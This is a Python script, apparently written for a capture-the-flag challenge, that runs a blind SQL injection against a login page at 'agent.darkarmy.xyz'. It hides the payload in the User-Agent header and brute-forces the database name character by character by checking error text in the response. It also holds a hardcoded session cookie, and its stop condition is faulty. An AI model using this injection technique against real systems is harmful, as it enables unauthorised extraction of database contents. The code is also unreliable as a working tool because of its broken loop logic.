import requests
import string
time = 5
brutestring ="abcdefghijklmnopqrstuvwxyz1234567890-_!@"
brutestring2 = string.ascii_lowercase+string.digits
url = "http://agent.darkarmy.xyz/"
def getdb_name():
	global dbname
	flag = True
	tmp = ""
	print('[!] Getting Database Name')
	while flag:
		for s in brutestring:# a b c 
			brutechar  = tmp + s # a
			# print(brutechar)
			payload = "' and (select 1 from dual where database() like '{}%') or '1'='1)--+".format(brutechar) # ag3nt_u_1s_v3ry_t3l3nt3d
			headers = {'User-Agent': '0.1{}'.format(payload)}
			# print(headers)
			cookie = {'__cfduid':'dca5faa1ab59cac37cd667562a52f17bd1601157769'}
			postdata = {"uname":"admin","passwd":"admin","submit":"Submit"}
			resp = requests.post(url,data = postdata , headers=headers, cookies=cookie)
			result = resp.text
			# print(result)
			if "Column 'uagent' cannot be null" not in result:
				tmp += s
				print("[!] Found "+tmp)
				if tmp == "@":
					dbname = tmp
					print("[+] Database Name = {} ".format(dbname))
					flag = False
					break
				else:
					break
getdb_name()